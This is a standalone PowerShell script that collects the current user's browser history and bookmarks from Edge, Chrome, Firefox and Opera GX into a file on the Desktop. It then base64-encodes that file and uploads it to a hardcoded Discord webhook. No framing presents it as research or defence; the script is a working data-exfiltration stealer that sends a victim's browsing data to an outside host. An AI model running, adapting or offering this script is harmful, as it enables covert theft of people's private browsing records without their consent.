function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,
        [Parameter(Position=1, Mandatory=$True)]
        [string]$DataType
    )

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome' -and $DataType -eq 'history') { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') { $Path = "$env:USERPROFILE\AppData\Local\Microsof/Edge/User Data/Default/Bookmarks" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') { $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
    elseif ($Browser -eq 'opera' -and $DataType -eq 'history') { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" }
    elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') { $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" }

    if (Test-Path $Path) {
        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
        $Value | ForEach-Object {
            $Key = $_
            if ($Key -match $Search) {
                New-Object -TypeName PSObject -Property @{
                    User = $env:UserName
                    Browser = $Browser
                    DataType = $DataType
                    Data = $_
                    Time = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
                }
            }
        }
    }
}

$OutputFile = "$Env:USERPROFILE\Desktop\BrowserData.txt"
$DiscordWebhookUrl = "https://discordapp.com/api/webhooks/1123943138432651315/FA45yGcL3AtHQHvqdNXIcje5eVmucuS_nXBXOVNYNo0yHkoRh3APMrcUXgD6w2Dgs_U4"

Get-BrowserData -Browser "edge" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $OutputFile
Get-BrowserData -Browser "chrome" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $OutputFile
Get-BrowserData -Browser "firefox" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "opera" -DataType "history" >> $OutputFile
Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $OutputFile

function Upload-Discord {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [Alias("f")]
        [string]$FilePath,

        [Parameter(Mandatory=$True)]
        [Alias("u")]
        [string]$WebhookUrl
    )

    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileBase64 = [System.Convert]::ToBase64String($fileBytes)
    $fileUriEncoded = [System.Uri]::EscapeDataString($fileBase64)

    $jsonPayload = @"
    {
        "file": "$fileUriEncoded"
    }
"@

    $response = Invoke-RestMethod -Uri $WebhookUrl -Method Post -ContentType "application/json" -Body $jsonPayload
    $response
}

Upload-Discord -FilePath $OutputFile -WebhookUrl $DiscordWebhookUrl
